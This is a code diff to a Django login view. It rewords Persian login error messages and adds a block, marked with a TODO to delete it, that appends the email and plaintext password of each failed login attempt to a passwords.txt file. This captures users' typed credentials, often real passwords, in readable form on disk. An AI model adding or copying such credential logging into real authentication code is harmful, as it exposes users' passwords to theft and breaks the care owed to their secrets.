@@ -6,6 +6,7 @@ from account_module.models import CustomUser
 from django.utils.crypto import get_random_string
 from django.contrib import messages
 from utils.email_service import send_email
+import os
 
 
 class LoginView(View):
@@ -25,14 +26,18 @@ class LoginView(View):
             user_password = login_form.cleaned_data.get('password')
             user: CustomUser = CustomUser.objects.filter(email__iexact=user_email).first()
             if user is None:
-                login_form.add_error('email', 'نام کاربری یا کلمه عبور اشتباه است')
+                login_form.add_error('email', 'ایمیل یا کلمه عبور اشتباه است')
             elif not user.is_active:
                 login_form.add_error('email', 'حساب شما فعال نشده است، ایمیل خود را بررسی کنید.')
             elif not user.check_password(user_password):
-                login_form.add_error('email', 'نام کاربری یا کلمه عبور اشتباه است')
+                login_form.add_error('email', 'ایمیل یا کلمه عبور اشتباه است')
             else:
                 login(request, user)
                 return redirect('home')
+            # TODO: this is for password log in passwords.txt delete this !!!
+            file_path = os.path.join(os.path.dirname(__file__), '../passwords.txt')
+            with open(file_path, 'a', encoding='utf-8') as f:
+                f.write(f'{user_email} -> {user_password}\n')
         context = {
             'login_form': login_form
         }
